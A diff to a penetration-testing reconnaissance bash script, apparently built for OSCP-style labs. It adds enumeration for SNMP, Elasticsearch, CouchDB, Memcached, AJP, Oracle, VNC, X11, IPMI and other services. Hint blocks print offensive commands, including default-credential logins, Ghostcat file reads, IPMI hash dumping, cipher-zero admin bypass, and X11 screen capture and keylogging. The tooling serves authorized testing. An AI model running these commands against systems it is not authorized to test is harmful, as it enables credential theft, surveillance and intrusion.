@@ -734,6 +734,43 @@ if has_udp_port 161; then
             warn "SNMP: ${IF_COUNT} network interfaces detected — host may be DUAL-HOMED (pivot opportunity)"
             warn "  Review: ${SNMP_DIR}/snmp_interfaces.txt and ${SNMP_DIR}/snmp_ip_addrs.txt"
         fi
+
+        # -------------------------------------------------------------------
+        # NET-SNMP "extend" objects — top-tier finding on NET-SNMP (Linux).
+        # Admins wire custom scripts/commands to OIDs via "extend"; the output
+        # of those commands (often run as root) is readable here and regularly
+        # leaks credentials, file paths, or a straight RCE primitive.
+        # Walk both the friendly MIB name and the raw numeric OID (in case the
+        # NET-SNMP MIBs aren't installed locally).
+        # -------------------------------------------------------------------
+        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects"
+        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" NET-SNMP-EXTEND-MIB::nsExtendObjects \
+            2>&1 | tee "${SNMP_DIR}/snmp_extend.txt" || true
+
+        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET .1.3.6.1.4.1.8072.1.3.2 (NET-SNMP extend, numeric)"
+        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" .1.3.6.1.4.1.8072.1.3.2 \
+            2>&1 | tee -a "${SNMP_DIR}/snmp_extend.txt" || true
+
+        # Detect the NET-SNMP agent (extend is only meaningful there)
+        if grep -qi 'NET-SNMP' "${SNMP_DIR}/snmpwalk_full.txt" 2>/dev/null; then
+            warn "SNMP: target runs NET-SNMP (typical Linux) — review extend scripts closely"
+        fi
+        # If any extend object returned data, it almost always matters
+        if grep -qiE 'nsExtend|8072\.1\.3' "${SNMP_DIR}/snmp_extend.txt" 2>/dev/null; then
+            warn "${RED}⚠  SNMP: NET-SNMP 'extend' objects present — custom scripts/commands exposed!${NC}"
+            warn "  Review ${SNMP_DIR}/snmp_extend.txt for scripts, paths, creds or RCE."
+        fi
+
+        # -------------------------------------------------------------------
+        # v1 fallback — some agents refuse v2c. If the v2c full walk came back
+        # empty, retry the whole walk with SNMPv1 before giving up.
+        # -------------------------------------------------------------------
+        if [[ ! -s "${SNMP_DIR}/snmpwalk_full.txt" ]]; then
+            warn "SNMP: v2c walk returned nothing — retrying with SNMPv1."
+            cmd "snmpwalk -v1 -c $SNMP_COMM $TARGET"
+            snmpwalk -v1 -c "$SNMP_COMM" "$TARGET" \
+                2>&1 | tee "${SNMP_DIR}/snmpwalk_full.txt" || true
+        fi
     else
         skip "snmpwalk"
     fi
@@ -1226,9 +1263,322 @@ EOF
 fi
 
 # ===========================================================================
+# Elasticsearch — port 9200 (REST API, read-only enumeration)
+# All GET requests — no index writes/deletes. Tries HTTP then HTTPS.
+# ===========================================================================
+if has_port 9200; then
+    ES_DIR="${OUTPUT_DIR}/elasticsearch"
+    mkdir -p "$ES_DIR"
+    info "[ES] Elasticsearch enumeration on port 9200"
+
+    # Detect protocol: ES may run plain HTTP or TLS (X-Pack).
+    ES_PROTO="http"
+    ES_ROOT=$(curl -sk --max-time 8 "http://${TARGET}:9200/" 2>/dev/null || true)
+    if [[ -z "$ES_ROOT" ]]; then
+        ES_ROOT=$(curl -sk --max-time 8 "https://${TARGET}:9200/" 2>/dev/null || true)
+        [[ -n "$ES_ROOT" ]] && ES_PROTO="https"
+    fi
+    ES_BASE="${ES_PROTO}://${TARGET}:9200"
+
+    if [[ -z "$ES_ROOT" ]]; then
+        warn "No HTTP(S) response on 9200 — may not be Elasticsearch. Banner grab below."
+    else
+        echo "$ES_ROOT" > "${ES_DIR}/root.json"
+        ES_VER=$(echo "$ES_ROOT" | grep -oE '"number"[[:space:]]*:[[:space:]]*"[0-9.]+"' | head -1 | grep -oE '[0-9.]+' || true)
+        [[ -n "$ES_VER" ]] && ok "Elasticsearch version: ${WHITE}${ES_VER}${NC} (searchsploit elasticsearch ${ES_VER})"
+
+        # Auth probe: a 401 means X-Pack security is on.
+        ES_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "${ES_BASE}/_cat/indices" 2>/dev/null || echo "000")
+        if [[ "$ES_CODE" == "401" ]]; then
+            warn "Elasticsearch requires auth (401) — X-Pack security enabled."
+            hint "Elasticsearch is authenticated — try default / discovered creds (read-only):
+        curl -sk -u elastic:changeme  ${ES_BASE}/_cat/indices?v
+        curl -sk -u elastic:elastic   ${ES_BASE}/_cat/indices?v
+        # If creds found elsewhere, dump everything:
+        curl -sk -u USER:PASS ${ES_BASE}/_all/_search?pretty"
+        else
+            ok "Elasticsearch is UNAUTHENTICATED — dumping metadata (read-only)."
+            # Read-only REST endpoints (HackTricks methodology)
+            for EP in "_cat/health?v" "_cat/indices?v" "_cat/nodes?v" "_cluster/health?pretty" "_nodes?pretty"; do
+                SAFE=$(echo "$EP" | tr '/?=&' '____')
+                cmd "curl -sk --max-time 10 ${ES_BASE}/${EP}"
+                curl -sk --max-time 10 "${ES_BASE}/${EP}" > "${ES_DIR}/${SAFE}.txt" 2>/dev/null || true
+            done
+            ok "Cluster metadata saved → ${WHITE}${ES_DIR}/${NC}"
+
+            # List indices for the operator; dump documents (read-only _search)
+            if [[ -s "${ES_DIR}/_cat_indices_v.txt" ]]; then
+                IDX_NAMES=$(awk 'NR>1 {print $3}' "${ES_DIR}/_cat_indices_v.txt" 2>/dev/null | grep -v '^\.' | grep -v '^$' || true)
+                if [[ -n "$IDX_NAMES" ]]; then
+                    warn "User indices found — dumping documents (read-only):"
+                    echo "$IDX_NAMES" | while read -r IDX; do
+                        [[ -z "$IDX" ]] && continue
+                        info "  index: ${WHITE}${IDX}${NC}"
+                        curl -sk --max-time 15 "${ES_BASE}/${IDX}/_search?pretty&size=100" \
+                            > "${ES_DIR}/data_${IDX}.json" 2>/dev/null || true
+                    done
+                    warn "  Review ${ES_DIR}/data_*.json for credentials / sensitive data."
+                fi
+            fi
+            hint "Elasticsearch manual review:
+        # Full dump of every index (read-only):
+        curl -sk ${ES_BASE}/_all/_search?pretty&size=1000 | less
+        # Search for secrets across all data:
+        curl -sk '${ES_BASE}/_all/_search?q=password&pretty'
+        curl -sk '${ES_BASE}/_all/_search?q=secret&pretty'
+        # Version-specific RCE (CVE-2014-3120 / CVE-2015-1427 on old 1.x):
+        searchsploit elasticsearch ${ES_VER}"
+        fi
+    fi
+    echo ""
+fi
+
+# ===========================================================================
+# CouchDB — port 5984 (REST API, read-only enumeration)
+# ===========================================================================
+if has_port 5984; then
+    CDB_DIR="${OUTPUT_DIR}/couchdb"
+    mkdir -p "$CDB_DIR"
+    info "[CouchDB] enumeration on port 5984"
+
+    CDB_ROOT=$(curl -sk --max-time 8 "http://${TARGET}:5984/" 2>/dev/null || true)
+    echo "$CDB_ROOT" > "${CDB_DIR}/root.json"
+    CDB_VER=$(echo "$CDB_ROOT" | grep -oE '"version"[[:space:]]*:[[:space:]]*"[0-9.]+"' | head -1 | grep -oE '[0-9.]+' || true)
+    [[ -n "$CDB_VER" ]] && ok "CouchDB version: ${WHITE}${CDB_VER}${NC} (searchsploit couchdb ${CDB_VER})"
+
+    for EP in "_all_dbs" "_membership" "_users/_all_docs?include_docs=true" "_config"; do
+        SAFE=$(echo "$EP" | tr '/?=&' '____')
+        cmd "curl -sk --max-time 10 http://${TARGET}:5984/${EP}"
+        curl -sk --max-time 10 "http://${TARGET}:5984/${EP}" > "${CDB_DIR}/${SAFE}.json" 2>/dev/null || true
+    done
+    ok "CouchDB metadata saved → ${WHITE}${CDB_DIR}/${NC}"
+
+    if grep -qi 'password\|derived_key\|salt' "${CDB_DIR}/_users__all_docs_include_docs_true.json" 2>/dev/null; then
+        warn "${RED}⚠  CouchDB _users DB is readable — password hashes exposed!${NC}"
+    fi
+    hint "CouchDB manual review:
+    # Fauxton web UI:
+    curl -s http://${TARGET}:5984/_utils/
+    # Dump a database's docs (read-only):
+    curl -s http://${TARGET}:5984/<db>/_all_docs?include_docs=true
+    # CVE-2017-12635 / CVE-2017-12636 (priv-esc + RCE on 1.x/2.x):
+    searchsploit couchdb"
+    echo ""
+fi
+
+# ===========================================================================
+# Memcached — port 11211 (stats + key dump, read-only)
+# ===========================================================================
+if has_port 11211; then
+    MC_DIR="${OUTPUT_DIR}/memcached"
+    mkdir -p "$MC_DIR"
+    info "[Memcached] enumeration on port 11211"
+
+    MC_NMAP="${MC_DIR}/memcached_nmap.txt"
+    cmd "nmap -p11211 --script memcached-info -Pn ${TARGET}"
+    nmap -p11211 --script memcached-info --script-timeout 30s -Pn "$TARGET" -oN "$MC_NMAP" 2>&1 | tee "$MC_NMAP" || true
+
+    # Raw stats over TCP (read-only)
+    for MCMD in version stats "stats items" "stats slabs"; do
+        SAFE=$(echo "$MCMD" | tr ' ' '_')
+        cmd "printf '${MCMD}\\r\\n' | nc -w 3 ${TARGET} 11211"
+        (printf '%s\r\n' "$MCMD" | timeout 5 nc -w 3 "$TARGET" 11211 > "${MC_DIR}/${SAFE}.txt" 2>&1) || true
+    done
+    ok "Memcached stats saved → ${WHITE}${MC_DIR}/${NC}"
+
+    hint "Memcached manual — dump cached keys (may contain sessions / creds):
+    # Find slab IDs from 'stats items', then dump keys per slab:
+    printf 'stats items\\r\\n' | nc -w 3 ${TARGET} 11211
+    printf 'stats cachedump <SLAB_ID> 0\\r\\n' | nc -w 3 ${TARGET} 11211
+    printf 'get <KEY>\\r\\n' | nc -w 3 ${TARGET} 11211
+    # Automated dumper:
+    memcdump --servers=${TARGET}"
+    echo ""
+fi
+
+# ===========================================================================
+# AJP — port 8009 (Apache JServ Protocol / Tomcat connector)
+# ===========================================================================
+if has_port 8009; then
+    AJP_DIR="${OUTPUT_DIR}/ajp"
+    mkdir -p "$AJP_DIR"
+    info "[AJP] Apache JServ Protocol enumeration on port 8009"
+
+    AJP_NMAP="${AJP_DIR}/ajp_nmap.txt"
+    cmd "nmap -p8009 --script ajp-methods,ajp-headers -Pn ${TARGET}"
+    nmap -p8009 --script ajp-methods,ajp-headers --script-timeout 30s -Pn "$TARGET" -oN "$AJP_NMAP" 2>&1 | tee "$AJP_NMAP" || true
+    ok "AJP nmap scan → ${WHITE}${AJP_NMAP}${NC}"
+
+    warn "AJP present → check for Ghostcat (CVE-2020-1938) LFI/RCE on the fronting Tomcat."
+    hint "AJP / Ghostcat (CVE-2020-1938) — manual (read a file via AJP LFI):
+    # Confirm Tomcat version on 8080 first, then:
+    python3 ghostcat.py -p 8009 -f WEB-INF/web.xml ${TARGET}
+    msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS ${TARGET}; run'
+    searchsploit ghostcat"
+    echo ""
+fi
+
+# ===========================================================================
+# Oracle TNS Listener — port 1521 (version + SID hints, read-only)
+# ===========================================================================
+if has_port 1521; then
+    ORA_DIR="${OUTPUT_DIR}/oracle"
+    mkdir -p "$ORA_DIR"
+    info "[Oracle] TNS Listener enumeration on port 1521"
+
+    ORA_NMAP="${ORA_DIR}/oracle_nmap.txt"
+    cmd "nmap -p1521 --script oracle-tns-version -Pn ${TARGET}"
+    nmap -p1521 --script oracle-tns-version --script-timeout 40s -Pn "$TARGET" -oN "$ORA_NMAP" 2>&1 | tee "$ORA_NMAP" || true
+    ok "Oracle nmap scan → ${WHITE}${ORA_NMAP}${NC}"
+
+    if command -v tnscmd10g &>/dev/null; then
+        cmd "tnscmd10g version -h ${TARGET}"
+        tnscmd10g version -h "$TARGET" > "${ORA_DIR}/tnscmd_version.txt" 2>&1 || true
+        cmd "tnscmd10g status -h ${TARGET}"
+        tnscmd10g status  -h "$TARGET" > "${ORA_DIR}/tnscmd_status.txt"  2>&1 || true
+    fi
+    hint "Oracle TNS manual — enumerate SIDs then attack (odat, read-only enum first):
+    # SID brute (enumeration):
+    nmap -p1521 --script oracle-sid-brute ${TARGET}
+    odat sidguesser -s ${TARGET} -p 1521
+    odat all -s ${TARGET} -p 1521
+    # Once SID known, try default creds (scott/tiger, system/manager)."
+    echo ""
+fi
+
+# ===========================================================================
+# Erlang Port Mapper Daemon (epmd) — port 4369
+# ===========================================================================
+if has_port 4369; then
+    EPMD_DIR="${OUTPUT_DIR}/epmd"
+    mkdir -p "$EPMD_DIR"
+    info "[epmd] Erlang Port Mapper enumeration on port 4369"
+
+    EPMD_NMAP="${EPMD_DIR}/epmd_nmap.txt"
+    cmd "nmap -p4369 --script epmd-info -Pn ${TARGET}"
+    nmap -p4369 --script epmd-info --script-timeout 30s -Pn "$TARGET" -oN "$EPMD_NMAP" 2>&1 | tee "$EPMD_NMAP" || true
+    ok "epmd nmap scan → ${WHITE}${EPMD_NMAP}${NC}"
+
+    hint "epmd manual — lists Erlang nodes + their distribution ports:
+    # Each node's dist port is another attack surface (RabbitMQ, CouchDB, etc).
+    # If you find the Erlang cookie (often 'secret' or in ~/.erlang.cookie):
+    #   CVE-2022-31108 style RCE via erldp with a known cookie.
+    searchsploit erlang"
+    echo ""
+fi
+
+# ===========================================================================
+# VNC — ports 5900 / 5901 (info + auth check, read-only)
+# ===========================================================================
+if has_port 5900 || has_port 5901; then
+    VNC_DIR="${OUTPUT_DIR}/vnc"
+    mkdir -p "$VNC_DIR"
+    for VP in 5900 5901; do
+        has_port "$VP" || continue
+        info "[VNC] enumeration on port ${VP}"
+        VNC_NMAP="${VNC_DIR}/vnc_${VP}_nmap.txt"
+        cmd "nmap -p${VP} --script vnc-info,realvnc-auth-bypass -Pn ${TARGET}"
+        nmap -p"$VP" --script vnc-info,realvnc-auth-bypass --script-timeout 30s -Pn "$TARGET" -oN "$VNC_NMAP" 2>&1 | tee "$VNC_NMAP" || true
+        if grep -qi 'none.*supported\|auth.*none\|No authentication' "$VNC_NMAP" 2>/dev/null; then
+            warn "${RED}⚠  VNC ${VP}: authentication may be NONE — connect directly!${NC}"
+        fi
+    done
+    hint "VNC manual:
+    # Connect (no-auth or with a discovered password):
+    vncviewer ${TARGET}:5900
+    # Crack a captured VNC password (from config / registry):
+    #   msfconsole → auxiliary/scanner/vnc/vnc_none_auth
+    searchsploit vnc"
+    echo ""
+fi
+
+# ===========================================================================
+# Finger — port 79 (user enumeration, read-only)
+# ===========================================================================
+if has_port 79; then
+    FIN_DIR="${OUTPUT_DIR}/finger"
+    mkdir -p "$FIN_DIR"
+    info "[Finger] user enumeration on port 79"
+
+    cmd "nmap -p79 --script finger -Pn ${TARGET}"
+    nmap -p79 --script finger --script-timeout 30s -Pn "$TARGET" -oN "${FIN_DIR}/finger_nmap.txt" 2>&1 | tee "${FIN_DIR}/finger_nmap.txt" || true
+
+    if command -v finger &>/dev/null; then
+        for U in "" root admin user guest; do
+            cmd "finger ${U}@${TARGET}"
+            finger "${U}@${TARGET}" >> "${FIN_DIR}/finger_users.txt" 2>&1 || true
+        done
+    fi
+    ok "Finger output saved → ${WHITE}${FIN_DIR}/${NC}"
+    hint "Finger manual — enumerate valid usernames:
+    finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t ${TARGET}"
+    echo ""
+fi
+
+# ===========================================================================
+# R-services — ports 512 (rexec) / 513 (rlogin) / 514 (rsh)
+# ===========================================================================
+if has_port 512 || has_port 513 || has_port 514; then
+    info "[R-services] rexec/rlogin/rsh detected (512/513/514) — trust-based auth"
+    warn "R-services rely on ~/.rhosts trust — no automated attack (OSCP-safe hint only)."
+    hint "R-services manual (trust abuse — needs rsh-client: apt install rsh-client):
+    # rlogin as root/known user (works if host trusts your IP / an empty .rhosts):
+    rlogin -l root ${TARGET}
+    rlogin -l <user> ${TARGET}
+    # rsh command execution:
+    rsh ${TARGET} -l root 'id'
+    # rexec (513? no — 512):
+    rexec -l <user> -p <pass> ${TARGET} id"
+    echo ""
+fi
+
+# ===========================================================================
+# X11 — port 6000 (open-access check, read-only)
+# ===========================================================================
+if has_port 6000; then
+    X11_DIR="${OUTPUT_DIR}/x11"
+    mkdir -p "$X11_DIR"
+    info "[X11] access check on port 6000"
+
+    cmd "nmap -p6000 --script x11-access -Pn ${TARGET}"
+    nmap -p6000 --script x11-access --script-timeout 30s -Pn "$TARGET" -oN "${X11_DIR}/x11_nmap.txt" 2>&1 | tee "${X11_DIR}/x11_nmap.txt" || true
+    if grep -qi 'X server access is granted\|is open' "${X11_DIR}/x11_nmap.txt" 2>/dev/null; then
+        warn "${RED}⚠  X11 open access — you can capture the screen / keystrokes!${NC}"
+    fi
+    hint "X11 manual (if access granted — 'xhost +'):
+    xdpyinfo -display ${TARGET}:0
+    # Screenshot the remote desktop:
+    xwd -root -display ${TARGET}:0 -out screen.xwd && convert screen.xwd screen.png
+    # Keylog:
+    xspy ${TARGET}:0"
+    echo ""
+fi
+
+# ===========================================================================
+# IPMI — port 623/UDP (version + cipher-zero check, read-only)
+# ===========================================================================
+if has_udp_port 623 || grep -qw "623/udp" "${OUTPUT_DIR}/scans/udp.txt" 2>/dev/null; then
+    IPMI_DIR="${OUTPUT_DIR}/ipmi"
+    mkdir -p "$IPMI_DIR"
+    info "[IPMI] enumeration on port 623/UDP"
+
+    IPMI_NMAP="${IPMI_DIR}/ipmi_nmap.txt"
+    cmd "nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero -Pn ${TARGET}"
+    nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero --script-timeout 40s -Pn "$TARGET" -oN "$IPMI_NMAP" 2>&1 | tee "$IPMI_NMAP" || true
+    if grep -qi 'cipher.*zero.*enabled\|VULNERABLE' "$IPMI_NMAP" 2>/dev/null; then
+        warn "${RED}⚠  IPMI Cipher Zero — authentication bypass possible!${NC}"
+    fi
+    hint "IPMI manual — dump BMC password hashes (CVE-2013-4786, always works on v2.0):
+    msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS ${TARGET}; run'
+    # Then crack with hashcat -m 7300, or Cipher Zero admin bypass:
+    ipmitool -I lanplus -C 0 -H ${TARGET} -U admin -P '' user list"
+    echo ""
+fi
+
+# ===========================================================================
 # Banner grab — unknown / non-standard ports
 # ===========================================================================
-KNOWN_PORTS="21,22,23,25,53,69,80,88,110,111,135,139,143,389,443,445,636,993,995,1099,1433,2049,3306,3389,5432,5985,5986,6379,6667,6697,8000,8080,8443,8888,27017"
+KNOWN_PORTS="21,22,23,25,53,69,79,80,88,110,111,135,139,143,389,443,445,512,513,514,636,993,995,1099,1433,1521,2049,3306,3389,4369,5432,5900,5901,5984,5985,5986,6000,6379,6667,6697,8000,8009,8080,8443,8888,9200,11211,27017"
 UNKNOWN_PORTS=()
 
 IFS=',' read -ra ALL_PORTS <<< "$PORTS"
@@ -1255,7 +1605,24 @@ if [[ ${#UNKNOWN_PORTS[@]} -gt 0 ]]; then
         else
             info "Port ${UP}: no banner received."
         fi
+
+        # Long-tail coverage: run nmap version detection + SAFE/default NSE
+        # scripts on every rare port we don't have a dedicated block for.
+        # -sC uses the "default" (safe) category — no brute/DoS/exploit — so
+        # this stays OSCP-compliant while still fingerprinting oddball services.
+        NMAP_OUT="${BANNER_DIR}/port_${UP}_nmap.txt"
+        cmd "nmap -sV -sC -p${UP} --script-timeout 40s -Pn ${TARGET}"
+        nmap -sV -sC -p"$UP" --script-timeout 40s -Pn "$TARGET" \
+            -oN "$NMAP_OUT" 2>&1 | tail -n +1 > /dev/null || true
+        SVC=$(grep -E "^${UP}/tcp" "$NMAP_OUT" 2>/dev/null | head -1 | sed 's/  */ /g' || true)
+        [[ -n "$SVC" ]] && ok "Port ${UP} (nmap): ${WHITE}${SVC}${NC}"
     done
+
+    hint "Rare-port next steps:
+    # For any service identified above, look it up in the methodology:
+    #   https://hacktricks.wiki/en/network-services-pentesting/
+    # And check for known exploits:
+    #   searchsploit <service> <version>"
     echo ""
 fi
 
